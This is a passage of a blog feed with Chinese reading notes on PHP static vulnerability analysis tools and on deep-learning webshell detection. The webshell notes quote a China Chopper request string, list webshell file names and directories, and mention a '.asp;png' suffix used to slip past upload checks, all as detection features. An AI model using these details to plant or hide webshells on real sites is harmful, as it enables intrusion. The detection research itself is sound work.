web应用时，效果将大打折扣。（MVC架构和传统架构最大的区别在于使用了“路由的方式”给URL的含义增加了不确定性）</p><p>（对SQL注入的防护：预编译，过滤）</p><p><strong>目前，对PHP代码的静态缺陷检测方式可以分为两类：直接分析源代码本身的方式和分析代码底层的方式。</strong></p><p>大多数PHP代码缺陷检测工具选择了对PHP代码先进行编译或转换的处理，使代码原本的逻辑关系暴露出来，便于进行分析。这样的检测方式大致有两类：</p><ul><li>（1）转换为中间语言</li><li>（2）转换为编译的中间结果（有开源的前端）</li></ul><p><strong>作者对RIPS观点</strong></p><p>RIPS，其分析方法是通过遍历token流，提取其中的关键节点并分析转化为一些自定义的结构，从编译的角度看，RIPS相当于实现了一个不完整的语法分析和中间代码生成过程。token流所提供的信息中，PHP代码的逻辑关系和整体结构并没有被体现出来，需要代码分析工具实现从中提取这些信息的逻辑，而实现这些信息的提取的逻辑实现起来极其复杂，可能是考虑到了这一问题，RIPS的作者放弃了这一检测方式，RIPS也停止了更新，由此可见token流并不适合直接用于代码分析。</p><p><strong>控制流图</strong>：使用数据流分析、污点分析等静态分析方法的代码缺陷检测方案都会使用控制流图来引导分析过程。</p><p><strong>数据流分析</strong></p><p>数据流分析根据数据流信息的传播方向与程序的执行路径的关系分为两类：</p><ul><li><p>1）前向数据流分析：数据流信息流向与程序执行路径相同的分析相同</p></li><li><p>2）后向数据流分析：数据流信息流向与程序执行路径相同的分析相反</p></li></ul><p>数据流分析方法</p><ul><li><p>（1）流敏感性</p></li><li><p>（2）过程间关系</p></li><li><p>（3）上下文敏感性</p></li></ul><p>数据流分析模式：</p><ul><li><p>（1）到达定值</p></li><li><p>（2）活跃变量</p></li><li><p>（3）可用表达式</p></li></ul><p><strong>开源的PHP语言编译前端</strong></p><ul><li>（1）phc</li><li>（2）peachpie</li><li>（3）HHVM</li><li>（4）ANTLR</li><li>（5）PHP-Parser（基于PHP语言开发的PHP语法分析器）👈需要了解一下</li></ul><p><strong>灰盒测试两种典型使用拓展的分析工具</strong></p><ul><li>（1）XDebug</li><li>（2）Taint</li></ul><p><strong>入口路劲分析</strong></p><p>主要针对的是国内的类似Thinkphp类MVC架构开发的web框架</p><p>通过获取model、controller、action三个路由参数进行入口路径构造</p><p>在对MVC架构应用的静态分析中会出现的难以处理的动态包含有两类，第一类是包含的路径中含有变量，需要在运行时才能确定其具体值，第二类是通过PHP的自动加载特性进行的包含。</p><p>提出基于污染传播记录的动态缺陷检测技术来对净化有效进行准确识别</p><p><img src="/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)PHP%E4%BB%A3%E7%A0%81%E7%BC%BA%E9%99%B7%E6%A3%80%E6%B5%8B%E6%8A%80%E6%9C%AF%E7%9A%84%E7%A0%94%E7%A9%B6%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20200312213925669.png" alt="image-20200312213925669"></p><p>安全进化代码得提取</p><p><img src="/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)PHP%E4%BB%A3%E7%A0%81%E7%BC%BA%E9%99%B7%E6%A3%80%E6%B5%8B%E6%8A%80%E6%9C%AF%E7%9A%84%E7%A0%94%E7%A9%B6%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20200312214318219.png" alt="image-20200312214318219"></p><p><img src="/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)PHP%E4%BB%A3%E7%A0%81%E7%BC%BA%E9%99%B7%E6%A3%80%E6%B5%8B%E6%8A%80%E6%9C%AF%E7%9A%84%E7%A0%94%E7%A9%B6%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20200312215525068.png" alt="image-20200312215525068"></p><p><strong>预处理</strong>：由于PHP动态包含特性的存在，我们无法一次性的将全部代码都进行编译，只能在分析过程中逐步解析并处理包含</p><p>分为针对传统架构和MVC架构</p><p>针对MVC架构：根据目标PHP应用的目录结构，指定相应的目录名和文件名特征，提取出全部控制器文件的路径，并使用PHP-Parser分析生成的抽象语法树，提取出入口参数集合，再根据其入口代码对应的入口生成规则，来生成相应的PHP入口文件集合。</p><p><img src="/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)PHP%E4%BB%A3%E7%A0%81%E7%BC%BA%E9%99%B7%E6%A3%80%E6%B5%8B%E6%8A%80%E6%9C%AF%E7%9A%84%E7%A0%94%E7%A9%B6%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20200313110622258.png" alt="image-20200313110622258"></p><p>通过对抽象语法树的遍历生成控制流图的操作流程大致如下：</p><ul><li>1）建立入口和出口节点，建立第一个基本块和连接出入口的边。</li><li>2）从根节点开始对语法树进行深度优先遍历。</li><li>3）在遇到分支、循环节点时，将当前基本块分割为该节点的前驱和后继块，分别保留入边和出边，并对每个条件分支，以分支的语法树节点作为根节点，将前驱和后继块作为其入口和出口，从2）开始生成控制流图，处理完分支后，在后继块上继续当前遍历操作。</li><li>4）在遇到函数、对象定义时，将定义节点作为新的根节点，生成独立的局部控制流图，生成完成后，继续在当前块上的遍历操作。</li><li>5）遇到其他类型节点时，将其放入当前基本块的节点数组中，继续当前的遍历操作直到所有节点被遍历，完成整个过程。</li></ul><p>本文采用流敏感、上下文敏感且考虑过程间关系的数据流分析方法，进行前向数据流分析</p><p>大多数使用漏洞规则的静态缺陷检测工具都会对污染源、危险函数、净化函数或类似的概念进行定义而形成检测规则，但通常会采用统一的污染源集合来判定污染传播的起始位置，再根据每一类漏洞定义危险函数和净化函数，这样的定义方式没有对不同漏洞类型的污染源进行区分，当检测非常规污染源漏洞时，如某些框架对用户输入做了封装，需要将封装后的api定义为污染源，这样的规则无法适应需求。</p><p><img src="/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)PHP%E4%BB%A3%E7%A0%81%E7%BC%BA%E9%99%B7%E6%A3%80%E6%B5%8B%E6%8A%80%E6%9C%AF%E7%9A%84%E7%A0%94%E7%A9%B6%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20200313113017396.png" alt="image-20200313113017396"></p><p>根据上述漏洞规则的定义方式，我们采用如下流程来分析到达危险函数的污染传播链表：<br>1）根据到达的危险函数，查找危险函数数组包含该危险函数的规则。<br>2）在1）找到的规则中，查找污染源数组包含该污染传播链表起点的规则。<br>3）根据查找出的规则，对比污染传播链中记录的污染传播运算，如果在污染传播链表中，没有发现对污染的净化函数，或是所有的净化函数都能够被反净化函数所抵消，则认为用户输入的恶意数据能够最终进入危险函数中，漏洞存在，反之则认为漏洞不存在。</p><p><img src="/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)PHP%E4%BB%A3%E7%A0%81%E7%BC%BA%E9%99%B7%E6%A3%80%E6%B5%8B%E6%8A%80%E6%9C%AF%E7%9A%84%E7%A0%94%E7%A9%B6%E4%B8%8E%E5%AE%9E%E7%8E%B0/image-20200313113221085.png" alt="image-20200313113221085"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;选择了能够支持主流PHP版本的PHP-Parser作为代码编译前端的基础，实现数据流分析所需的代码编译和控制流图的生成，同时针对MVC框架的特点，使用重定义入口集合的方式解决检测是对代码分支覆盖不足的问题。&lt;/p&gt;
&lt;p&gt;提出了一种基于污染传播记录的动态检测方法。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Cyc1e的学术之路" scheme="https://cyc1e183.github.io/categories/Cyc1e%E7%9A%84%E5%AD%A6%E6%9C%AF%E4%B9%8B%E8%B7%AF/"/>
    
    
      <category term="web漏洞挖掘" scheme="https://cyc1e183.github.io/tags/web%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>(阅读笔记)PHP程序污点型漏洞静态检测方法</title>
    <link href="https://cyc1e183.github.io/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)PHP%E7%A8%8B%E5%BA%8F%E6%B1%A1%E7%82%B9%E5%9E%8B%E6%BC%8F%E6%B4%9E%E9%9D%99%E6%80%81%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95/"/>
    <id>https://cyc1e183.github.io/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)PHP%E7%A8%8B%E5%BA%8F%E6%B1%A1%E7%82%B9%E5%9E%8B%E6%BC%8F%E6%B4%9E%E9%9D%99%E6%80%81%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95/</id>
    <published>2020-10-12T14:03:51.000Z</published>
    <updated>2020-10-27T02:07:13.675Z</updated>
    
    <content type="html"><![CDATA[<p>提出一种静态代码分析检测的方法</p><blockquote><p>提出的生成控制流图的算法</p><p>对内置特征、入口点和敏感点进行建模，精确分析数据流</p><p>提出基于有效路径的污点分析方法，提高了分析的准确性，实现了基于变量回溯的路径遍历算法</p></blockquote><p>污点型漏洞检测技术分类可以归纳为：动态测试、静态分析和动静态结合的方式</p><p>PHP语言具有动态性和弱类型两种特点</p><p>基于PHP内置函数token_get_all 和token_name 对PHP 程序分词，生成AST（抽象语法树），进而在AST基础上进行PHP的语法和词法分析[11]，精确的字符串分析提取函数摘要，并创建CFG</p><blockquote><p>token_get_all — 将提供的源码按 PHP 标记进行分割，可以用作php源代码的压缩，会按照固定的分解方法，分解php代码成不同的部分</p><p>token_name — 获取提供的 PHP 解析器代号的符号名称</p></blockquote><p>原型系统：</p><ul><li><p>预处理阶段：生成完整的CFG图，对文件进行扫描-》生成主函数语法解析树和UDF（用户自定义函数）语法解析树-》从主函数开始将语法解析树生成控制流图CFG。</p></li><li><p>污点分析阶段：提取输入源到敏感点的有效路径和输入源到敏感点路径上的数据流分析</p></li></ul><p><strong>CFG(控制流图)生成算法</strong>：</p><p>输入：一个数组形式的AST（抽象语法树）。<br>输出：控制流图。<br>（1）当前基本块CurrentBlock 为NULL，控制流节点集合CFNS 包含＜if|switch|try|三元操作|逻辑运算符＞，控制流退出节点CFRS＜return|exit＞。<br>（2）读取AST当前位置根节点n 。<br>（3）如果n 不在当前基本块中，则加入到当前基本块中。<br>（4）如果n 属于CFNS，则保存跳转条件，将下一个基本块与当前基本块相连，并对每条分支AST执行步骤2<br>（5）如果n 属于CFRS，则本条路径结束。<br>（6）所有子节点都结束后算法停止。</p><p><strong>基于有效路径遍历的污点分析方法</strong></p><ul><li>提取数据输入源到敏感函数的有效路径</li><li>在有效路径上进行污点分析</li></ul><p><strong>基于变量回溯的路径遍历算法</strong><br>输入：程序CFG。<br>输出：变量传递路径。<br>（1）CFG 中标记出一个满足条件的敏感函数Vfun ，设为顶点，其对应的一个敏感参数为变量Param，保存在集合Variables中。<br>（2）选择下一个邻接点Ni（条件语句节点），如果Variables中存在超全局变量元素，则标记出一条路径（包含入口点）。如果存在非超全局变量元素，则执行（3）。如果Variables 为空，则执行（5）。<br>（3）分析顶点到Ni 间的数据流，如果存在Variable 中变量元素Vi 的传递过程，则执行（4）；否则，执行2。<br>（4）将Vi 的上一级变量保存在集合Variables 中。将Ni设为顶点，执行（2）。<br>（5）标记出全部有效路径，退出算法。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;提出一种静态代码分析检测的方法&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;提出的生成控制流图的算法&lt;/p&gt;
&lt;p&gt;对内置特征、入口点和敏感点进行建模，精确分析数据流&lt;/p&gt;
&lt;p&gt;提出基于有效路径的污点分析方法，提高了分析的准确性，实现了基于变量回溯的路径遍历算法&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="Cyc1e的学术之路" scheme="https://cyc1e183.github.io/categories/Cyc1e%E7%9A%84%E5%AD%A6%E6%9C%AF%E4%B9%8B%E8%B7%AF/"/>
    
    
      <category term="web漏洞挖掘" scheme="https://cyc1e183.github.io/tags/web%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>(阅读笔记)PHP 开源白盒审计工具初探（上）</title>
    <link href="https://cyc1e183.github.io/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)PHP%E5%BC%80%E6%BA%90%E7%99%BD%E7%9B%92%E5%AE%A1%E8%AE%A1%E5%B7%A5%E5%85%B7%E5%88%9D%E6%8E%A2/"/>
    <id>https://cyc1e183.github.io/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)PHP%E5%BC%80%E6%BA%90%E7%99%BD%E7%9B%92%E5%AE%A1%E8%AE%A1%E5%B7%A5%E5%85%B7%E5%88%9D%E6%8E%A2/</id>
    <published>2020-10-12T14:03:51.000Z</published>
    <updated>2020-10-27T02:08:04.364Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP-开源白盒审计工具初探（上）"><a href="#PHP-开源白盒审计工具初探（上）" class="headerlink" title="PHP 开源白盒审计工具初探（上）"></a>PHP 开源白盒审计工具初探（上）</h1><p>当前PHP开源白盒审计工具的设计思路上大都是依据 敏感函数的参数部分/全部来自未经安全函数处理的外部输入 这一经验。最终落实到具体的实现上又可以划分成以下两大类：</p><ul><li><strong>基于文本特征</strong>：也就是我们常说的正则方式，基于人工代码审计时发现漏洞点的源代码规律，从而归纳出相应的正则表达式，然后基于此正则表达式来查找此类漏洞。基于文本特征的白盒审计工具优点在于审计速度相对较快，且规则维护起来成本较低，但是缺点又在于准确率相对较低，误报率也比较高。</li><li><strong>基于静态分析</strong>：即借助传统静态分析技术来进行白盒审计。常见的技术主要有数据流分析、污点传播和控制流分析等。静态分析的方式能够更加准确的判断外部输入是否经过安全函数的处理，这点是基于文本特征的方式很难实现的。此外，基于静态分析的方式在判断一个变量是否部分/全部来自外部输入的时候也更有优势，尤其在针对框架进行审计的时候。但是，有好的一面就有坏的一面，基于静态分析的问题在于：1）时间开销大，做一次完整的分析所需的时间远大于基于文本特征的方式；2）适配成本高，针对不同的目标，需要适配相应的解析器来生成所需的 AST 树和 CFG 等信息，此外，检测规则的适配也是一个相对较重的成本。</li></ul><p><img src="/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)PHP%E5%BC%80%E6%BA%90%E7%99%BD%E7%9B%92%E5%AE%A1%E8%AE%A1%E5%B7%A5%E5%85%B7%E5%88%9D%E6%8E%A2/640.png" alt="img"></p><h1 id="PHP-开源白盒审计工具初探（下）"><a href="#PHP-开源白盒审计工具初探（下）" class="headerlink" title="PHP 开源白盒审计工具初探（下）"></a>PHP 开源白盒审计工具初探（下）</h1><p><strong>基于静态分析</strong>：即借助传统静态分析技术来进行白盒审计。常见的技术主要有数据流分析、污点传播和控制流分析等。静态分析的方式能够更加准确的判断外部输入是否经过安全函数的处理，这点是基于文本特征的方式很难实现的。此外，基于静态分析的方式在判断一个变量是否部分/全部来自外部输入的时候也更有优势，尤其在针对框架进行审计的时候。但是，有好的一面就有坏的一面，基于静态分析的问题在于：</p><ul><li>1）时间开销大，做一次完整的分析所需的时间远大于基于文本特征的方式；</li><li>2）适配成本高，针对不同的目标，需要适配相应的解析器来生成所需的 AST 树和 CFG 等信息，此外，检测规则的适配也是一个相对较重的成本。</li></ul><h3 id><a href="#" class="headerlink" title></a></h3><h3 id="progpilot"><a href="#progpilot" class="headerlink" title="progpilot"></a>progpilot</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Githu<span class="variable">b:</span> http<span class="variable">s:</span>//github.<span class="keyword">com</span>/designsecurity/progpilotLanguage: </span><br><span class="line">PHPLast commit <span class="keyword">on</span> <span class="number">2019.06</span>.<span class="number">02</span></span><br></pre></td></tr></table></figure><p>progpilot 是一款使用 PHP 开发的针对 PHP 的白盒审计框架，基于  PHP-CFG（<a href="https://github.com/ircmaxell/php-cfg/）来实现控制流图" target="_blank" rel="noopener">https://github.com/ircmaxell/php-cfg/）来实现控制流图</a> (CFG) 的生成，同时又基于  PHP-Parser（<a href="https://github.com/nikic/php-parser）" target="_blank" rel="noopener">https://github.com/nikic/php-parser）</a> 来实现抽象语法书 ( AST 树) 的生成。</p><p>progpilot 在 CFG 和 AST 的基础上做进一步的漏洞分析。progpilot 借助生成的 CFG  图检查指定函数之间执行顺序是否符合预定义的规则。progpilot 还会检查指定函数的参数是否满足规则。progpilot  支持以下四种方式来检测漏洞：</p><ol><li>sources：在分析过程中，将 sources.json 中指定的函数参数作为污点进行分析；</li><li>sinks：在 sinks.json 中指明危险函数及其可能导致的漏洞类型</li><li>sanitizers：在sanitizers.json中指明防御特定漏洞安全函数及其用法。此处，安全函数会修改参数的值，比如转义；</li><li>validators：在validators.json中指明防御特定漏洞的安全函数及其用法。此处，安全函数不会修改污点的值。</li></ol><p>progpilot 的检测规则位于 package/src/uptodate_data。其提供了 PHP 和 JavaScript 的通用检测规则。对于 PHP 而言，progpilot 还提供CodeIgniter，PrestaShop，SuiteCRM，SymFony，WordPress 这五个框架的定制化检测规则。</p><h3 id="RIPS"><a href="#RIPS" class="headerlink" title="RIPS"></a>RIPS</h3><p>RIPS 使用 PHP Zend 引擎语法分析器获取源码 Token 流信息，然后基于这个 Token 流信息生成相应的 AST 树和 CFG。然后，RIPS  在此基础上定位敏感函数，然后对敏感函数的参数进行回溯，检查其是否为用户可控输入，以此来判断是否有漏洞。RIPS  在变量回溯过程中会检查该变量是否进行安全函数的处理来减少误报。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>十几款白盒审计工具看下来给我的感觉是自动化代码审计仍然是一个任重而道远的活计。正如开头的所说的，目前主流的 PHP 白盒审计工具都是基于同一条经验。这个经验可以简单拆分成三个子问题：</p><ol><li><ol><li>定位敏感函数；</li></ol></li><li><ol><li>参数部分/全部来自外部输入；</li></ol></li><li><ol><li>外部输入在传递过程中是否经过安全函数处理。</li></ol></li></ol><p>针对第一个问题，现如今的方案基本上可以解决了。针对第二个问题，通过静态分析的方式可以基本解决大部分的情况，但仍然存在较大的改进空间，比如针对源码更加全面深入的解析、借助数据库等的二次输入等等；第三个问题现如今依然是一个重灾区，基本上还停留在传递链上是否存在安全函数的判断，而未考虑多次编码导致的绕过问题，安全函数可以被绕过等问题。再者，近几年来我们设计白盒审计工具的原理基本上都是一致，是否存在现如今技术条件下其他更好的设计方案？这点还是有待商榷的。有趣的是，同样是漏洞挖掘，二进制方面的不管是工业界还是学术界都有相当一部分人在研究，但是回归 WEB 这边，主力就都是工业界的人。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;PHP-开源白盒审计工具初探（上）&quot;&gt;&lt;a href=&quot;#PHP-开源白盒审计工具初探（上）&quot; class=&quot;headerlink&quot; title=&quot;PHP 开源白盒审计工具初探（上）&quot;&gt;&lt;/a&gt;PHP 开源白盒审计工具初探（上）&lt;/h1&gt;&lt;p&gt;当前PHP开源白盒审计工具的设计思路上大都是依据 敏感函数的参数部分/全部来自未经安全函数处理的外部输入 这一经验。最终落实到具体的实现上又可以划分成以下两大类：&lt;/p&gt;
    
    </summary>
    
    
      <category term="Cyc1e的学术之路" scheme="https://cyc1e183.github.io/categories/Cyc1e%E7%9A%84%E5%AD%A6%E6%9C%AF%E4%B9%8B%E8%B7%AF/"/>
    
    
      <category term="web漏洞挖掘" scheme="https://cyc1e183.github.io/tags/web%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
  </entry>
  
  <entry>
    <title>(阅读笔记)Web Behavior Detection Based on Deep Neural Network</title>
    <link href="https://cyc1e183.github.io/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)Web%20Behavior%20Detection%20Based%20on%20Deep%20Neural%20Network/"/>
    <id>https://cyc1e183.github.io/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)Web%20Behavior%20Detection%20Based%20on%20Deep%20Neural%20Network/</id>
    <published>2020-10-12T14:03:51.000Z</published>
    <updated>2020-10-27T02:09:03.727Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)Web%20Behavior%20Detection%20Based%20on%20Deep%20Neural%20Network/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0" alt>Web Behavior Detection Based on Deep Neural Network/image-20201011194942388.png)</p><p><strong>算法</strong>：DNN</p><p><strong>特征</strong>：文本特征，采用n-gram和TFIDF算法处理</p><p>在本文中，WOG模型是基于2-Gram模型[21]的，该模型假定一个词仅与下一个词有关。</p><p><img src="/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)Web%20Behavior%20Detection%20Based%20on%20Deep%20Neural%20Network/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0" alt>Web Behavior Detection Based on Deep Neural Network/image-20201011201940236.png)</p><p>在本文中，卷积层用于捕获句子级别中输入单词序列的表示。单词序列实际上是一维向量。因此，我们使用128个1维滤镜提取特征，其中包括1×3、1×4、1×5和1×6跨度为1的滤镜。二次采样操作使用最大池化技术，最大池化技术代表2×2区域。卷积层的激活函数设置为常用的整流线性单位（ReLU）函数，如式。  （1）。 L2正则化技术用于增强卷积层的通用性。</p><p><img src="/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)Web%20Behavior%20Detection%20Based%20on%20Deep%20Neural%20Network/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0" alt>Web Behavior Detection Based on Deep Neural Network/image-20201011201557782.png)</p><p>LSTM层用于捕获句子之间的长关系。也就是说，LSTM层能够基于CNN层捕获的句子表示形式，在文章级别实现PHP脚本的表示。LSTM层包括128个单位，使用tanh激活函数，如式。 （2）。为了降低过度拟合的风险，我们对LSTM层使用了0.8的辍学率。</p><p><img src="/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)Web%20Behavior%20Detection%20Based%20on%20Deep%20Neural%20Network/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0" alt>Web Behavior Detection Based on Deep Neural Network/image-20201011201831090.png)</p><p>全连接（FC）层等于多层感知器（MLP），用于处理从LSTM层输出的商品级别的分类任务。在我们的设计中，FC层包括20个隐藏节点。</p><p>使用softmax层（如等式（3））来区分正常和异常PHP代码</p><p><img src="/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)Web%20Behavior%20Detection%20Based%20on%20Deep%20Neural%20Network/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0" alt>Web Behavior Detection Based on Deep Neural Network/image-20201011202138534.png)</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)Web%20Behavior%20Detection%20Based%20on%20Deep%20Neural%20Network/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0&quot; alt&gt;Web Behavior Detection Based on Deep Neural Network/image-20201011194942388.png)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;算法&lt;/strong&gt;：DNN&lt;/p&gt;
    
    </summary>
    
    
      <category term="Cyc1e的学术之路" scheme="https://cyc1e183.github.io/categories/Cyc1e%E7%9A%84%E5%AD%A6%E6%9C%AF%E4%B9%8B%E8%B7%AF/"/>
    
    
      <category term="webshell检测" scheme="https://cyc1e183.github.io/tags/webshell%E6%A3%80%E6%B5%8B/"/>
    
  </entry>
  
  <entry>
    <title>(阅读笔记)Webshell Traffic Detection With Character-Level Features Based on Deep Learning</title>
    <link href="https://cyc1e183.github.io/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)Webshell%20Traffic%20Detection%20With%20Character-Level%20Features%20Based%20on%20Deep%20Learning/"/>
    <id>https://cyc1e183.github.io/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)Webshell%20Traffic%20Detection%20With%20Character-Level%20Features%20Based%20on%20Deep%20Learning/</id>
    <published>2020-10-12T14:03:51.000Z</published>
    <updated>2020-10-27T02:10:06.819Z</updated>
    
    <content type="html"><![CDATA[<p>提出了一种结合卷积神经网络和长短期记忆网络的特征的Webshell通信检测模型</p><p>提出了一种字符级交通内容特征转换方法。</p><p>主要动机是从网络流量中发现Webshell攻击，尤其是未知攻击</p><p>提出了结合卷积神经网络（CNN）[4]，[5]和长短期记忆（LSTM）[6]，[7]的深度学习模型架构。  CNN用于提取局部关键字段特征，文本序列的特征由LSTM捕获。</p><p>贡献：</p><ul><li>提出了字符级方法来转换Webshell内容特征，它可以完全保留流量内容的顺序模式特征。同时，可以减小尺寸，并且提高了模型检测的效果。在实际情况下，亿万个流量项目会有更好的性能。</li><li>提出了结合了CNN和LSTM的深度学习检测模型结构。通过将LSTM层拼接到CNN层的隐藏输出结果中，我们可以实现局部特征和序列特征的全面提取。组合模型检测比单个CNN模型和单个LSTM模型更有效。</li></ul><p>本文的动机是从流量中发现Webshell攻击，尤其是未知攻击。因此，在分析流量时，我们将Webshell分为以下两种类型：</p><ul><li>基于浏览器和服务器（B＆S）的Webshell。这种Webshell主要用于基于Web的应用程序中。黑客通过漏洞（例如文件上传）将Webshell文件上传到目标网站，并通过浏览器与上传的Web  Shell建立连接。浏览器使用Post方法发送命令参数，返回的包的内容通常是执行控制命令后返回的HTML结构的内容。（不仅仅是POST）</li><li>基于客户端和服务器（C＆S）的Webshell：这种Webshell基于客户端将命令发送到服务器。以China Chopper为例，客户端使用Base64对命令执行脚本进行编码，然后将服务器连接到One  Word  Trojan程序，服务器使用指定的分隔符分隔指令执行结果，并将结果返回给客户端。从流量的角度来看，服务器返回的结果通常是命令执行的结果，而不是完整的HTML页面结构，此外，请求包还包含更多的执行内容。这两种Webshell通过URL和Post正文传递请求信息。同时，它可以包含上述各种Webshell类别，例如“大木马，小木马，单字木马”。</li></ul><p><strong>数据采集</strong>：</p><ul><li>收集从大学网络监控系统中提取的大量网站通信流量，包括正常流量和异常流量。经过长时间的积累，我们获得了大约60万个Webshell恶意流量，其中包括请求和响应正文。</li><li>在实验室环境中模拟Webshell攻击。</li></ul><p><strong>数据清理</strong></p><ul><li>URL 解码</li><li>BASE64解码</li><li>消除加密的影响：首先确定加密的数据位置，然后将相应部分替换为预定义的标志。这有助于减少对模型预测结果的干扰。</li><li>二进制数据流：首先确定二进制流的位置，然后用预定义的标志替换相应位置中的数据</li></ul><p><img src="/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)Webshell%20Traffic%20Detection%20With%20Character-Level%20Features%20Based%20on%20Deep%20Learning/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0" alt>Webshell Traffic Detection With Character-Level Features Based on Deep Learning/image-20201013101930560.png)</p><p><strong>常用的分词方法</strong></p><ul><li>N-GRAM WITH TF-IDF</li><li>N-GRAM WITH Word2Vec：使用word2vec算法创建的嵌入向量具有许多优势。词嵌入后，每个词可以表示为固定长度向量，尺寸可以大大减少。但是，对于海量数据处理需求，该模型需要大量时间和资源来训练和生成单词向量</li></ul><p><strong>本文提出字符级内容特征转换</strong></p><p>将内容信息转换为特征向量。对于长流量内容，我们定义固定长度L。如果内容长度大于L，则截断L长度的数据。如果内容长度小于L，我们将在数据的开头至结尾重复数据，直到数据长度等于L</p><p>对于每个输入，我们将字符序列转换为相应的ASCII值序列。如果遇到非ASCII可见字符（例如汉字），我们将这些字符删除，最后形成特征向量。</p><p><strong>例</strong>：‘‘/1.qaz.jsp chopper=i&amp;z0=gb2312’’</p><p>内容的长度为30，相应的ASCII向量为：[47，49，46，113，97，122，46，106，115，112，32，99，104，111，112，112，101，114，61 ，105，38，122，48，61，103，98，50，51，49，50]。</p><p>对于请求数据包，我们将URL和Post主体拼接在一起以生成原始数据。通过分析Webshell流量的内容特征，我们发现其独特的特征如下：</p><ul><li>URL特征：Webshell文件通常位于敏感目录中，例如“ images/”，“ css/”。这些文件通常使用敏感名称命名，例如“ dama.jsp”，“  shell.php”。文件后缀名称通常是php，asp和jsp。也存在混淆的文件后缀，例如“ .asp; png”，以避免文件上传验证。</li><li>POST内容特征：一些PHP系统调用命令嵌入到Postbody值之后，由Base64编码。更重要的是，关键命令代码是使用Base64编码的，这与正常流量非常不同。</li></ul><p>经过特征分析后，我们确定固定长度序列的长度和特定的字符替换规则</p><p><strong>基于深度学习的WEBSHELL检测模型</strong></p><p>基于卷积神经网络（CNN）[4]，[5]和长短期记忆网络（LSTM）</p><p><img src="/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)Webshell%20Traffic%20Detection%20With%20Character-Level%20Features%20Based%20on%20Deep%20Learning/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0" alt>Webshell Traffic Detection With Character-Level Features Based on Deep Learning/image-20201013103751220.png)</p><p>webshell检测平台：</p><p><img src="/2020/10/12/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0)Webshell%20Traffic%20Detection%20With%20Character-Level%20Features%20Based%20on%20Deep%20Learning/(%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0" alt>Webshell Traffic Detection With Character-Level Features Based on Deep Learning/image-20201013154926935.png)</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;提出了一种结合卷积神经网络和长短期记忆网络的特征的Webshell通信检测模型&lt;/p&gt;
&lt;p&gt;提出了一种字符级交通内容特征转换方法。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Cyc1e的学术之路" scheme="https://cyc1e183.github.io/categories/Cyc1e%E7%9A%84%E5%AD%A6%E6%9C%AF%E4%B9%8B%E8%B7%AF/"/>
    
    
      <category term="webshell检测" scheme="https://cyc1e183.github.io/tags/webshell%E6%A3%80%E6%B5%8B/"/>
    
